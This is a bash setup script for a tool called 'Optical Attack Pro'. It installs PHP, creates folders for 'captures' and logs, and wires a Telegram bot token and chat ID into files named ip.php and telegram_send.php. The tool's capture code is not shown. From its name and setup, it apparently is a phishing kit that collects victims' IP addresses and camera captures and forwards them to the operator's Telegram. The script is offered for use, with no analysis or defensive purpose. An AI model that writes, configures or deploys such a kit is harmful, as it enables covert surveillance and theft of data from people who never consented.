#!/bin/bash

# Optical Attack Pro Setup
# Made by Ahsan

clear
echo "╔════════════════════════════════════════╗"
echo "║   Optical Attack Pro v1.0 - Setup     ║"
echo "║          Made by Ahsan                 ║"
echo "╚════════════════════════════════════════╝"
echo ""

# Check if PHP is installed
command -v php > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[!] PHP is not installed. Installing..."
    apt-get update -y
    apt-get install php -y
fi

echo "[+] Creating directory structure..."
mkdir -p optical_captures
mkdir -p optical_logs

echo "[+] Directories created:"
echo "    ├── optical_captures/ (for local backups)"
echo "    └── optical_logs/ (for activity logs)"
echo ""

echo "╔════════════════════════════════════════╗"
echo "║    Telegram Configuration Required     ║"
echo "╚════════════════════════════════════════╝"
echo ""
echo "Follow these steps:"
echo ""
echo "[STEP 1] Create Telegram Bot:"
echo "  1. Open Telegram and search for @BotFather"
echo "  2. Send /newbot"
echo "  3. Give it a name (example: OpticalAttackBot)"
echo "  4. Copy the TOKEN"
echo ""
echo "[STEP 2] Get Your Chat ID:"
echo "  1. Send a message to your bot"
echo "  2. Visit: https://api.telegram.org/botYOUR_TOKEN/getUpdates"
echo "  3. Find 'chat' -> 'id' in the response"
echo ""

read -p "Enter your Telegram BOT TOKEN: " bot_token
read -p "Enter your Telegram CHAT ID: " chat_id

echo ""
echo "[+] Configuring Optical Attack Pro..."

# Update ip.php
sed -i "s|YOUR_BOT_TOKEN_HERE|$bot_token|g" ip.php
sed -i "s|YOUR_CHAT_ID_HERE|$chat_id|g" ip.php

# Update telegram_send.php
sed -i "s|YOUR_BOT_TOKEN_HERE|$bot_token|g" telegram_send.php
sed -i "s|YOUR_CHAT_ID_HERE|$chat_id|g" telegram_send.php

echo "[+] Configuration complete!"
echo ""
echo "╔════════════════════════════════════════╗"
echo "║         Ready to Deploy                ║"
echo "║    Optical Attack Pro v1.0             ║"
echo "║       Made by Ahsan                    ║"
echo "╚════════════════════════════════════════╝"
echo ""
echo "Start the server:"
echo "  bash start.sh"
echo ""
echo "Then access locally:"
echo "  http://localhost:3333"
echo ""
